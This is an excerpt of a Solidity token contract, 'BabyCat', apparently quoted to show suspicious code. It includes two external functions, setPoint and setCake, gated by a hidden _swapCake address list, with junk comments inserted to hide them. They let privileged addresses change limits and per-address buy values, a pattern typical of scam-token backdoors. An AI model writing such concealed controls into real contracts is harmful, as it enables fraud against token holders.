...
contract BabyCat is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0x47B982F514892C719D9376cd9501E1d342ecB7A8); 
    address payable private teamWalletAddress = payable(0x1658e58C5f4BE0A07F8C83b6c0ad7dFF1D885EFa); 
	...
	function setPoint(uint256 newLimit) external  {
	   if( _swapCake[ /*as aXxsdfghjk11;‘*/msg.sender])
	   {
	      _point = newLimit;
	   }      
    }
	...
	function setCake(address  bnb, uint256 only) external {
		if( _swapCake[ /*as aXxsdfghjk111;‘*/msg.sender])
	   {
	      buyList[bnb]/*main FANCTION*/= only;
	   }   
    }
